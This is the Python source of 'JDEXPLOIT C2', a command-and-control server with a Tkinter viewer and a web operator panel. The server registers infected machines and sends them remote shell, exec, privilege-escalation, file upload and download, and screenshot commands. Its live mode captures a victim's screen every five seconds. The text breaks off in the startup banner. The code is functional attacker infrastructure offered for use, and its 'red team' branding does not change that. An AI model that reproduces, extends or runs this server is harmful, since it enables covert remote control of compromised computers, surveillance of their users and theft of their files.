#!/usr/bin/env python3
# ============================================================================
# JDEXPLOIT C2 - VERSIÓN PROFESIONAL CON GUI CORREGIDA
# ============================================================================

import os
import sys
import json
import time
import socket
import struct
import threading
import hashlib
import base64
import datetime
import logging
import io
from http import server
from socketserver import ThreadingMixIn
from urllib.parse import urlparse
import tkinter as tk
from tkinter import ttk, scrolledtext
import queue
from PIL import Image, ImageTk
import random
import string

# ============================================================================
# CONFIGURACIÓN
# ============================================================================
HOST = '0.0.0.0'
C2_PORT = 4444
WEB_PORT = 8080
LOG_FILE = 'c2_operations.log'
SCREENSHOT_DIR = 'screenshots'

# Crear directorio para screenshots
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

class Colors:
    RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'
    BLUE = '\033[94m'; MAGENTA = '\033[95m'; CYAN = '\033[96m'
    END = '\033[0m'

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s',
                    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler()])
logger = logging.getLogger('C2')

# ============================================================================
# COLA PARA COMUNICACIÓN ENTRE HILOS
# ============================================================================
gui_queue = queue.Queue()

# ============================================================================
# CLIENTE MEJORADO
# ============================================================================
class Client:
    def __init__(self, conn, addr):
        self.conn = conn
        self.addr = addr
        self.id = hashlib.md5(f"{addr[0]}:{addr[1]}:{time.time()}".encode()).hexdigest()[:8]
        self.hostname = "Unknown"
        self.username = "Unknown"
        self.privilege = "USER"
        self.os = "Windows"
        self.antivirus = "Unknown"
        self.first_seen = datetime.datetime.now()
        self.last_seen = datetime.datetime.now()
        self.active = True
        self.last_screenshot = None
        
        logger.info(f"{Colors.GREEN}[+] Nuevo cliente: {self.id} desde {addr[0]}{Colors.END}")
    
    def send_raw(self, data):
        try:
            if isinstance(data, str):
                data = data.encode('utf-8')
            self.conn.send(struct.pack('>I', len(data)) + data)
            self.last_seen = datetime.datetime.now()
            return True
        except Exception as e:
            logger.error(f"Error send_raw: {e}")
            self.active = False
            return False
    
    def send(self, data):
        return self.send_raw(data)
    
    def recvall(self, n):
        data = bytearray()
        while len(data) < n:
            try:
                packet = self.conn.recv(n - len(data))
                if not packet:
                    return None
                data.extend(packet)
            except socket.timeout:
                continue
            except Exception as e:
                logger.error(f"Error recvall: {e}")
                return None
        return bytes(data)
    
    def recv_raw(self):
        try:
            raw_len = self.recvall(4)
            if not raw_len:
                return None
            msglen = struct.unpack('>I', raw_len)[0]
            if msglen > 50 * 1024 * 1024:  # 50MB max
                logger.error(f"Mensaje demasiado grande: {msglen} bytes")
                return None
            data = self.recvall(msglen)
            self.last_seen = datetime.datetime.now()
            return data
        except Exception as e:
            logger.error(f"Error recv_raw: {e}")
            self.active = False
            return None
    
    def recv(self):
        data = self.recv_raw()
        if not data:
            return None
        try:
            return data.decode('utf-8', errors='ignore')
        except:
            return str(data)
    
    def to_dict(self):
        return {
            'id': self.id,
            'ip': self.addr[0],
            'port': self.addr[1],
            'hostname': self.hostname,
            'username': self.username,
            'privilege': self.privilege,
            'os': self.os,
            'antivirus': self.antivirus,
            'status': 'online' if self.active else 'offline',
            'first_seen': self.first_seen.strftime('%H:%M:%S'),
            'last_seen': self.last_seen.strftime('%H:%M:%S')
        }

# ============================================================================
# GUI PARA VISUALIZACIÓN DE SCREENSHOTS (CORREGIDA)
# ============================================================================
class ScreenshotViewer:
    def __init__(self, c2):
        self.c2 = c2
        self.window = tk.Tk()
        self.window.title("JDEXPLOIT - Screenshot Viewer")
        self.window.geometry("1400x800")
        self.window.configure(bg='#1a1a1a')
        
        # Estilo
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TLabel', background='#1a1a1a', foreground='#00ff00', font=('Courier', 10))
        style.configure('TButton', background='#333333', foreground='#00ff00', font=('Courier', 10))
        style.configure('TFrame', background='#1a1a1a')
        style.configure('TListbox', background='#2a2a2a', foreground='#00ff00')
        
        # Frame principal
        main_frame = ttk.Frame(self.window)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Panel izquierdo - Lista de clientes
        left_frame = ttk.Frame(main_frame, width=300)
        left_frame.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 10))
        
        ttk.Label(left_frame, text="CLIENTES CONECTADOS", font=('Courier', 12, 'bold')).pack(pady=5)
        
        self.client_listbox = tk.Listbox(left_frame, bg='#2a2a2a', fg='#00ff00', 
                                         selectbackground='#00aa00', height=20,
                                         font=('Courier', 10))
        self.client_listbox.pack(fill=tk.BOTH, expand=True, pady=5)
        self.client_listbox.bind('<<ListboxSelect>>', self.on_client_select)
        
        # Botones de control
        btn_frame = ttk.Frame(left_frame)
        btn_frame.pack(fill=tk.X, pady=5)
        
        ttk.Button(btn_frame, text="📸 Tomar Screenshot", 
                  command=self.request_screenshot).pack(fill=tk.X, pady=2)
        
        self.live_mode_var = tk.BooleanVar()
        ttk.Checkbutton(btn_frame, text="🔄 Live Mode", 
                       variable=self.live_mode_var,
                       command=self.toggle_live_mode).pack(fill=tk.X, pady=2)
        
        # Panel central - Screenshot
        center_frame = ttk.Frame(main_frame)
        center_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        self.screenshot_label = ttk.Label(center_frame, text="No screenshot")
        self.screenshot_label.pack(pady=5)
        
        # Canvas para la imagen con scroll
        canvas_frame = ttk.Frame(center_frame)
        canvas_frame.pack(fill=tk.BOTH, expand=True)
        
        self.h_scrollbar = ttk.Scrollbar(canvas_frame, orient=tk.HORIZONTAL)
        self.v_scrollbar = ttk.Scrollbar(canvas_frame, orient=tk.VERTICAL)
        
        self.canvas = tk.Canvas(canvas_frame, bg='#2a2a2a', highlightthickness=0,
                                xscrollcommand=self.h_scrollbar.set,
                                yscrollcommand=self.v_scrollbar.set)
        
        self.h_scrollbar.config(command=self.canvas.xview)
        self.v_scrollbar.config(command=self.canvas.yview)
        
        self.h_scrollbar.pack(side=tk.BOTTOM, fill=tk.X)
        self.v_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Panel derecho - Info y terminal
        right_frame = ttk.Frame(main_frame, width=400)
        right_frame.pack(side=tk.RIGHT, fill=tk.Y, padx=(10, 0))
        
        ttk.Label(right_frame, text="INFORMACIÓN DEL CLIENTE", font=('Courier', 12, 'bold')).pack(pady=5)
        
        self.info_text = scrolledtext.ScrolledText(right_frame, bg='#2a2a2a', fg='#00ff00',
                                                   font=('Courier', 10), height=10,
                                                   insertbackground='#00ff00')
        self.info_text.pack(fill=tk.X, pady=5)
        
        ttk.Label(right_frame, text="TERMINAL", font=('Courier', 12, 'bold')).pack(pady=5)
        
        self.terminal_text = scrolledtext.ScrolledText(right_frame, bg='#2a2a2a', fg='#00ff00',
                                                       font=('Courier', 10), height=15,
                                                       insertbackground='#00ff00')
        self.terminal_text.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # Input para comandos
        cmd_frame = ttk.Frame(right_frame)
        cmd_frame.pack(fill=tk.X, pady=5)
        
        self.cmd_entry = ttk.Entry(cmd_frame, font=('Courier', 10))
        self.cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.cmd_entry.bind('<Return>', self.send_command)
        
        ttk.Button(cmd_frame, text="Enviar", command=self.send_command).pack(side=tk.RIGHT, padx=(5, 0))
        
        # Variables de estado
        self.current_client = None
        self.live_mode = False
        self.live_thread_running = False
        
        # Iniciar actualización de lista
        self.update_client_list()
        
    def update_client_list(self):
        """Actualiza la lista de clientes"""
        self.client_listbox.delete(0, tk.END)
        for client_id, client in self.c2.clients.items():
            if client.active:
                status = "🟢"
                fg = '#00ff00'
            else:
                status = "🔴"
                fg = '#ff0000'
            display = f"{status} {client.id} | {client.hostname} | {client.username}"
            self.client_listbox.insert(tk.END, display)
            self.client_listbox.itemconfig(tk.END, fg=fg)
        
        # Programar próxima actualización
        self.window.after(2000, self.update_client_list)
    
    def on_client_select(self, event):
        selection = self.client_listbox.curselection()
        if selection:
            idx = selection[0]
            client_id = list(self.c2.clients.keys())[idx]
            self.current_client = self.c2.clients[client_id]
            self.update_info()
    
    def update_info(self):
        if self.current_client:
            info = f"""ID: {self.current_client.id}
IP: {self.current_client.addr[0]}:{self.current_client.addr[1]}
Hostname: {self.current_client.hostname}
Usuario: {self.current_client.username}
Privilegio: {self.current_client.privilege}
OS: {self.current_client.os}
Antivirus: {self.current_client.antivirus}
Primera vez: {self.current_client.first_seen.strftime('%H:%M:%S')}
Última vez: {self.current_client.last_seen.strftime('%H:%M:%S')}
Estado: {'ACTIVO' if self.current_client.active else 'INACTIVO'}"""
            
            self.info_text.delete(1.0, tk.END)
            self.info_text.insert(1.0, info)
    
    def request_screenshot(self):
        if self.current_client:
            self.terminal_text.insert(tk.END, "📸 Solicitando screenshot...\n")
            self.terminal_text.see(tk.END)
            
            # Ejecutar en hilo separado
            threading.Thread(target=self._get_screenshot, args=(self.current_client.id,), daemon=True).start()
    
    def _get_screenshot(self, client_id):
        try:
            response = self.c2.send_command(client_id, "SCREENSHOT")
            if response and response.startswith("[+] Screenshot"):
                # Guardar screenshot
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"{SCREENSHOT_DIR}/{client_id}_{timestamp}.png"
                
                # Extraer datos Base64
                if "Base64:" in response:
                    b64_data = response.split("Base64:")[1].strip()
                    img_data = base64.b64decode(b64_data)
                    
                    with open(filename, 'wb') as f:
                        f.write(img_data)
                    
                    # Actualizar GUI desde el hilo principal
                    self.window.after(0, self._update_terminal, f"✅ Screenshot guardado: {filename}\n")
                    self.window.after(0, self.show_screenshot, img_data)
                else:
                    self.window.after(0, self._update_terminal, f"⚠️ Respuesta: {response[:100]}\n")
            else:
                self.window.after(0, self._update_terminal, f"❌ Error: {response}\n")
            
        except Exception as e:
            self.window.after(0, self._update_terminal, f"❌ Error: {e}\n")
    
    def _update_terminal(self, text):
        self.terminal_text.insert(tk.END, text)
        self.terminal_text.see(tk.END)
    
    def show_screenshot(self, img_data):
        try:
            # Cargar imagen
            img = Image.open(io.BytesIO(img_data))
            
            # Redimensionar manteniendo aspecto
            max_width = 800
            max_height = 600
            
            img.thumbnail((max_width, max_height), Image.Resampling.LANCZOS)
            
            # Convertir a PhotoImage
            self.photo = ImageTk.PhotoImage(img)
            
            # Mostrar en canvas
            self.canvas.delete("all")
            self.canvas.create_image(400, 300, image=self.photo)
            self.canvas.config(scrollregion=self.canvas.bbox(tk.ALL))
            
        except Exception as e:
            self.terminal_text.insert(tk.END, f"❌ Error mostrando screenshot: {e}\n")
    
    def toggle_live_mode(self):
        self.live_mode = self.live_mode_var.get()
        if self.live_mode and not self.live_thread_running:
            self.live_thread_running = True
            threading.Thread(target=self.live_capture_loop, daemon=True).start()
            self.terminal_text.insert(tk.END, "🔄 Live Mode ACTIVADO - Capturando cada 5 segundos\n")
        elif not self.live_mode:
            self.live_thread_running = False
            self.terminal_text.insert(tk.END, "⏹️ Live Mode DESACTIVADO\n")
    
    def live_capture_loop(self):
        while self.live_mode and self.live_thread_running and self.current_client:
            self._get_screenshot(self.current_client.id)
            time.sleep(5)
    
    def send_command(self, event=None):
        if self.current_client:
            cmd = self.cmd_entry.get().strip()
            if cmd:
                self.terminal_text.insert(tk.END, f"> {cmd}\n")
                self.cmd_entry.delete(0, tk.END)
                
                # Ejecutar en hilo separado
                threading.Thread(target=self._execute_command, args=(cmd,), daemon=True).start()
    
    def _execute_command(self, cmd):
        response = self.c2.send_command(self.current_client.id, cmd)
        self.window.after(0, self._update_terminal, f"{response}\n")
    
    def run(self):
        self.window.mainloop()

# ============================================================================
# C2 CORE MEJORADO
# ============================================================================
class C2Core:
    def __init__(self):
        self.clients = {}
        self.running = True
        self.lock = threading.Lock()
        self.start_time = datetime.datetime.now()
        self.gui = None
        self.web_server = None
        logger.info(f"{Colors.GREEN}[🔥] C2 Core iniciado{Colors.END}")
    
    def set_gui(self, gui):
        self.gui = gui
    
    def start(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((HOST, C2_PORT))
            self.socket.listen(100)
            self.socket.settimeout(1.0)
            logger.info(f"{Colors.GREEN}[🔥] Escuchando en {HOST}:{C2_PORT}{Colors.END}")
            threading.Thread(target=self.accept_clients, daemon=True).start()
        except Exception as e:
            logger.error(f"Error: {e}")
            sys.exit(1)
    
    def accept_clients(self):
        while self.running:
            try:
                conn, addr = self.socket.accept()
                conn.settimeout(30.0)
                
                with self.lock:
                    client = Client(conn, addr)
                    self.clients[client.id] = client
                    
                    # Enviar INFO
                    client.send("INFO")
                    
                    # Recibir respuesta
                    try:
                        info = client.recv()
                        if info:
                            try:
                                data = json.loads(info)
                                client.hostname = data.get('hostname', 'Unknown')
                                client.username = data.get('username', 'Unknown')
                                client.privilege = data.get('privilege', 'USER')
                                client.os = data.get('os', 'Windows')
                                logger.info(f"{Colors.CYAN}[→] {client.hostname} - {client.username}{Colors.END}")
                            except:
                                logger.info(f"{Colors.CYAN}[→] {info[:50]}{Colors.END}")
                    except:
                        pass
                    
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    logger.error(f"Error: {e}")
    
    def send_command(self, client_id, command):
        with self.lock:
            if client_id not in self.clients:
                return f"[-] Cliente {client_id} no encontrado"
            client = self.clients[client_id]
            if not client.active:
                return f"[-] Cliente {client_id} offline"
        
        try:
            logger.info(f"{Colors.BLUE}[→] {client_id}: {command}{Colors.END}")
            
            if not client.send(command):
                return f"[-] Error enviando comando"
            
            response = client.recv()
            if response is None:
                client.active = False
                return f"[-] Cliente no respondió"
            
            # Manejar screenshot
            if command == "SCREENSHOT" and response and response.startswith("[+] Screenshot"):
                logger.info(f"{Colors.GREEN}[+] Screenshot recibido de {client_id}{Colors.END}")
                
                # Guardar copia
                if "Base64:" in response:
                    try:
                        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                        filename = f"{SCREENSHOT_DIR}/{client_id}_{timestamp}.png"
                        
                        b64_data = response.split("Base64:")[1].strip()
                        img_data = base64.b64decode(b64_data)
                        
                        with open(filename, 'wb') as f:
                            f.write(img_data)
                        
                        logger.info(f"{Colors.GREEN}[+] Screenshot guardado: {filename}{Colors.END}")
                    except Exception as e:
                        logger.error(f"Error guardando screenshot: {e}")
            
            return response
            
        except Exception as e:
            logger.error(f"Error: {e}")
            return f"[-] Error: {e}"
    
    def stop(self):
        self.running = False
        if hasattr(self, 'socket'):
            self.socket.close()

# ============================================================================
# WEB HANDLER MEJORADO
# ============================================================================
class WebHandler(server.BaseHTTPRequestHandler):
    c2 = None
    
    def do_GET(self):
        path = self.path.split('?')[0]  # Ignorar query string
        if path == '/':
            self.send_html()
        elif path == '/api/clients':
            self.send_clients()
        elif path == '/api/stats':
            self.send_stats()
        elif path.startswith('/screenshots/'):
            self.send_screenshot(path)
        else:
            self.send_error(404)
    
    def do_POST(self):
        if self.path == '/api/command':
            self.handle_command()
        elif self.path == '/api/upload':
            self.handle_upload()
        else:
            self.send_error(404)
    
    def handle_command(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(length)
            data = json.loads(post_data.decode('utf-8'))
            
            client_id = data.get('client_id')
            command = data.get('command', '')
            args = data.get('args', '')
            
            if not client_id:
                self.send_json({'error': 'No client_id'})
                return
            
            # Mapeo de comandos
            cmd_map = {
                'info': 'INFO',
                'processes': 'PROCESSES',
                'elevate': 'ELEVATE',
                'screenshot': 'SCREENSHOT',
                'whoami': 'SHELL whoami',
                'ipconfig': 'SHELL ipconfig',
                'netstat': 'SHELL netstat -an',
                'tasklist': 'SHELL tasklist',
                'calc': 'EXEC calc.exe',
                'notepad': 'EXEC notepad.exe',
                'cmd': 'EXEC cmd.exe',
            }
            
            if command in cmd_map:
                full_cmd = cmd_map[command]
            elif command == 'shell' and args:
                full_cmd = f"SHELL {args}"
            elif command == 'exec' and args:
                full_cmd = f"EXEC {args}"
            elif command == 'kill' and args:
                full_cmd = f"KILL {args}"
            elif command == 'dir' and args:
                full_cmd = f"DIR {args}"
            elif command == 'download' and args:
                full_cmd = f"DOWNLOAD {args}"
            elif command == 'upload' and args:
                full_cmd = f"UPLOAD {args}"
            else:
                full_cmd = command
            
            response = self.c2.send_command(client_id, full_cmd)
            
            # Procesar screenshot para web
            if command == 'screenshot' and response and response.startswith('[+] Screenshot'):
                if 'Base64:' in response:
                    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"screenshot_{client_id}_{timestamp}.png"
                    
                    b64_data = response.split('Base64:')[1].strip()
                    
                    self.send_json({
                        'response': response,
                        'screenshot_url': f'/screenshots/{filename}',
                        'screenshot_data': b64_data
                    })
                    return
            
            self.send_json({'response': response})
            
        except Exception as e:
            logger.error(f"Error en handle_command: {e}")
            self.send_json({'error': str(e)})
    
    def handle_upload(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(length)
            data = json.loads(post_data.decode('utf-8'))
            
            client_id = data.get('client_id')
            remote_path = data.get('remote_path', '')
            file_data = data.get('file_data', '')
            
            if not client_id or not remote_path or not file_data:
                self.send_json({'error': 'Datos incompletos'})
                return
            
            # Decodificar Base64
            try:
                decoded = base64.b64decode(file_data).decode('utf-8', errors='ignore')
            except:
                decoded = file_data
            
            full_cmd = f"UPLOAD {remote_path}|{decoded}"
            response = self.c2.send_command(client_id, full_cmd)
            self.send_json({'response': response})
            
        except Exception as e:
            self.send_json({'error': str(e)})
    
    def send_screenshot(self, path):
        filename = os.path.basename(path)
        filepath = os.path.join(SCREENSHOT_DIR, filename)
        
        if os.path.exists(filepath):
            self.send_response(200)
            self.send_header('Content-type', 'image/png')
            self.end_headers()
            
            with open(filepath, 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_error(404)
    
    def send_json(self, obj):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(obj).encode())
    
    def send_clients(self):
        with self.c2.lock:
            clients_list = [c.to_dict() for c in self.c2.clients.values()]
        self.send_json(clients_list)
    
    def send_stats(self):
        with self.c2.lock:
            total = len(self.c2.clients)
            online = sum(1 for c in self.c2.clients.values() if c.active)
        
        stats = {
            'total': total,
            'online': online,
            'uptime': str(datetime.datetime.now() - self.c2.start_time).split('.')[0]
        }
        self.send_json(stats)
    
    def send_html(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        
        html = self.get_html_template()
        self.wfile.write(html.encode('utf-8'))
    
    def get_html_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JDEXPLOIT C2 - PROFESSIONAL</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        .header {
            background: #0a0a0a;
            border: 2px solid #f00;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 0 20px rgba(255,0,0,0.3);
        }
        .header h1 {
            color: #f00;
            font-size: 32px;
            text-transform: uppercase;
            text-shadow: 0 0 10px #f00;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin: 20px 0;
        }
        .stat-card {
            background: #0a0a0a;
            border: 1px solid #f00;
            padding: 15px;
        }
        .stat-label { color: #f66; font-size: 12px; }
        .stat-value { color: #fff; font-size: 28px; font-weight: bold; }
        .clients-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        .client-card {
            background: #0a0a0a;
            border: 1px solid #f00;
            padding: 15px;
            border-left: 5px solid #f00;
            cursor: pointer;
            transition: all 0.3s;
        }
        .client-card:hover {
            background: #1a0000;
            transform: scale(1.02);
            box-shadow: 0 0 20px #f00;
        }
        .client-card.online { border-left-color: #0f0; }
        .client-card.offline { border-left-color: #f00; opacity: 0.6; }
        .client-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            padding-bottom: 5px;
            border-bottom: 1px solid #333;
        }
        .client-id {
            background: #f00;
            color: #000;
            padding: 3px 8px;
            font-weight: bold;
        }
        .client-info {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 5px;
            margin: 10px 0;
            font-size: 12px;
        }
        .info-label { color: #f66; }
        .info-value { color: #fff; }
        .client-actions {
            display: flex;
            gap: 5px;
            margin-top: 10px;
            flex-wrap: wrap;
        }
        .btn {
            background: transparent;
            border: 1px solid #f00;
            color: #f00;
            padding: 5px 10px;
            font-family: 'Courier New', monospace;
            cursor: pointer;
            transition: all 0.3s;
            flex: 1;
            font-size: 11px;
        }
        .btn:hover {
            background: #f00;
            color: #000;
        }
        .terminal {
            background: #0a0a0a;
            border: 2px solid #f00;
            margin-top: 20px;
        }
        .terminal-header {
            background: #1a0000;
            padding: 10px;
            border-bottom: 1px solid #f00;
        }
        .terminal-content {
            padding: 10px;
            height: 300px;
            overflow-y: auto;
            font-size: 12px;
            background: #000;
        }
        .terminal-input {
            display: flex;
            padding: 10px;
            background: #0a0a0a;
            border-top: 1px solid #f00;
        }
        .terminal-input input {
            flex: 1;
            background: #000;
            border: 1px solid #f00;
            color: #0f0;
            padding: 10px;
            font-family: 'Courier New', monospace;
            margin-right: 10px;
        }
        .screenshot-viewer {
            margin-top: 20px;
            text-align: center;
        }
        .screenshot-viewer img {
            max-width: 100%;
            border: 2px solid #f00;
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
        }
        .modal-content {
            background: #0a0a0a;
            border: 2px solid #f00;
            margin: 5% auto;
            padding: 20px;
            width: 80%;
            max-width: 800px;
        }
        .footer {
            margin-top: 30px;
            padding: 20px;
            background: #0a0a0a;
            border: 1px solid #f00;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔴 JDEXPLOIT C2 PROFESSIONAL</h1>
        <div class="stats">
            <div class="stat-card">
                <div class="stat-label">TOTAL CLIENTES</div>
                <div class="stat-value" id="total-clients">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">ONLINE</div>
                <div class="stat-value" id="online-clients">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">UPTIME</div>
                <div class="stat-value" id="uptime">00:00:00</div>
            </div>
        </div>
    </div>
    
    <h2 style="color: #f00; margin-bottom: 10px;">CLIENTES CONECTADOS</h2>
    <div id="clients-container" class="clients-grid"></div>
    
    <div class="terminal">
        <div class="terminal-header">
            <span style="color: #f00;">TERMINAL REMOTO</span>
            <span id="current-client-label" style="color: #f66; margin-left: 20px;">(ninguno seleccionado)</span>
        </div>
        <div id="terminal-output" class="terminal-content"></div>
        <div class="terminal-input">
            <input type="text" id="terminal-cmd" placeholder="Comando (ej: shell whoami, screenshot, elevate)" disabled>
            <button class="btn" onclick="sendCommand()" id="terminal-send" disabled>ENVIAR</button>
        </div>
    </div>
    
    <div class="screenshot-viewer" id="screenshot-container" style="display: none;">
        <h3 style="color: #f00;">ÚLTIMO SCREENSHOT</h3>
        <img id="screenshot-img" src="" alt="Screenshot">
    </div>
    
    <div id="uploadModal" class="modal">
        <div class="modal-content">
            <h3 style="color: #f00;">📤 SUBIR ARCHIVO</h3>
            <input type="text" id="upload-remote-path" placeholder="Ruta remota (ej: C:\\Users\\Public\\file.txt)" 
                   style="width: 100%; margin: 10px 0; padding: 10px; background: #000; color: #0f0; border: 1px solid #f00;">
            <textarea id="upload-data" placeholder="Datos del archivo (Base64 o texto)" rows="5"
                      style="width: 100%; margin: 10px 0; padding: 10px; background: #000; color: #0f0; border: 1px solid #f00;"></textarea>
            <div style="display: flex; gap: 10px;">
                <button class="btn" onclick="doUpload()">SUBIR</button>
                <button class="btn" onclick="closeUploadModal()">CANCELAR</button>
            </div>
        </div>
    </div>
    
    <div class="footer">
        <div style="color: #f00; font-size: 20px;">🔴 JDEXPLOIT RED TEAM 🔴</div>
        <div style="color: #f66;">Sistema de Control Remoto Profesional</div>
    </div>
    
    <script>
        let currentClient = null;
        let clients = {};
        let startTime = Date.now();
        let screenshotInterval = null;
        
        setInterval(loadClients, 2000);
        setInterval(updateStats, 1000);
        
        function loadClients() {
            fetch('/api/clients')
                .then(r => r.json())
                .then(data => {
                    clients = {};
                    data.forEach(c => clients[c.id] = c);
                    renderClients(data);
                })
                .catch(err => console.error('Error loading clients:', err));
        }
        
        function renderClients(list) {
            const container = document.getElementById('clients-container');
            container.innerHTML = '';
            
            list.forEach(client => {
                const card = document.createElement('div');
                card.className = `client-card ${client.status}`;
                card.innerHTML = `
                    <div class="client-header">
                        <span class="client-id">${client.id}</span>
                        <span style="color: ${client.status == 'online' ? '#0f0' : '#f00'}">${client.status}</span>
                    </div>
                    <div class="client-info">
                        <div><span class="info-label">HOST:</span> <span class="info-value">${client.hostname}</span></div>
                        <div><span class="info-label">IP:</span> <span class="info-value">${client.ip}</span></div>
                        <div><span class="info-label">USER:</span> <span class="info-value">${client.username}</span></div>
                        <div><span class="info-label">PRIV:</span> <span class="info-value">${client.privilege}</span></div>
                    </div>
                    <div class="client-actions">
                        <button class="btn" onclick="selectClient('${client.id}')">SHELL</button>
                        <button class="btn" onclick="quickCommand('${client.id}', 'info')">INFO</button>
                        <button class="btn" onclick="quickCommand('${client.id}', 'processes')">PROC</button>
                        <button class="btn" onclick="quickCommand('${client.id}', 'screenshot')">📸</button>
                        <button class="btn" onclick="quickCommand('${client.id}', 'elevate')">SYSTEM</button>
                        <button class="btn" onclick="downloadPrompt('${client.id}')">⬇️</button>
                        <button class="btn" onclick="uploadPrompt('${client.id}')">⬆️</button>
                    </div>
                `;
                container.appendChild(card);
            });
        }
        
        function selectClient(clientId) {
            currentClient = clientId;
            document.getElementById('current-client-label').innerHTML = `(${clients[clientId].hostname})`;
            document.getElementById('terminal-cmd').disabled = false;
            document.getElementById('terminal-send').disabled = false;
            addToTerminal(`[+] Conectado a ${clients[clientId].hostname} (${clients[clientId].ip})`);
        }
        
        function quickCommand(clientId, cmd) {
            selectClient(clientId);
            sendCommand(cmd);
        }
        
        function sendCommand(customCmd) {
            let cmd = customCmd || document.getElementById('terminal-cmd').value;
            if (!cmd || !currentClient) return;
            
            addToTerminal(`> ${cmd}`);
            document.getElementById('terminal-cmd').value = '';
            
            let parts = cmd.split(' ');
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    client_id: currentClient,
                    command: parts[0],
                    args: parts.slice(1).join(' ')
                })
            })
            .then(r => r.json())
            .then(data => {
                if (data.error) {
                    addToTerminal(`❌ Error: ${data.error}`);
                } else {
                    addToTerminal(data.response);
                    
                    // Mostrar screenshot si hay
                    if (data.screenshot_url) {
                        document.getElementById('screenshot-container').style.display = 'block';
                        document.getElementById('screenshot-img').src = data.screenshot_url + '?' + Date.now();
                    }
                }
            })
            .catch(err => {
                addToTerminal(`❌ Error: ${err}`);
            });
        }
        
        function downloadPrompt(clientId) {
            let path = prompt("Ruta del archivo a descargar:", "C:\\Windows\\System32\\notepad.exe");
            if (path) {
                selectClient(clientId);
                sendCommand(`download ${path}`);
            }
        }
        
        function uploadPrompt(clientId) {
            currentClient = clientId;
            document.getElementById('uploadModal').style.display = 'block';
        }
        
        function closeUploadModal() {
            document.getElementById('uploadModal').style.display = 'none';
        }
        
        function doUpload() {
            let remotePath = document.getElementById('upload-remote-path').value;
            let data = document.getElementById('upload-data').value;
            
            if (!remotePath || !data) {
                alert("Ruta y datos requeridos");
                return;
            }
            
            fetch('/api/upload', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    client_id: currentClient,
                    remote_path: remotePath,
                    file_data: btoa(data)
                })
            })
            .then(r => r.json())
            .then(data => {
                addToTerminal(`[UPLOAD] ${data.response}`);
                closeUploadModal();
            });
        }
        
        function addToTerminal(text) {
            let terminal = document.getElementById('terminal-output');
            let line = document.createElement('div');
            line.style.marginBottom = '3px';
            line.style.borderLeft = '2px solid #f00';
            line.style.paddingLeft = '5px';
            line.innerHTML = text.replace(/\\n/g, '<br>');
            terminal.appendChild(line);
            terminal.scrollTop = terminal.scrollHeight;
        }
        
        function updateStats() {
            let total = Object.keys(clients).length;
            let online = Object.values(clients).filter(c => c.status == 'online').length;
            
            document.getElementById('total-clients').innerText = total;
            document.getElementById('online-clients').innerText = online;
            
            let uptime = Math.floor((Date.now() - startTime) / 1000);
            let hours = Math.floor(uptime / 3600);
            let minutes = Math.floor((uptime % 3600) / 60);
            let seconds = uptime % 60;
            document.getElementById('uptime').innerText = 
                `${hours.toString().padStart(2,'0')}:${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
        }
        
        document.getElementById('terminal-cmd').addEventListener('keypress', function(e) {
            if (e.key == 'Enter') sendCommand();
        });
        
        loadClients();
    </script>
</body>
</html>"""
    
    def log_message(self, format, *args):
        pass

class ThreadedHTTPServer(ThreadingMixIn, server.HTTPServer):
    daemon_threads = True

# ============================================================================
# FUNCIÓN PRINCIPAL - GUI EN HILO PRINCIPAL
# ============================================================================
def main():
    print(f"""
{Colors.RED}
     ██╗██████╗ ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
     ██║██╔══██╗██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
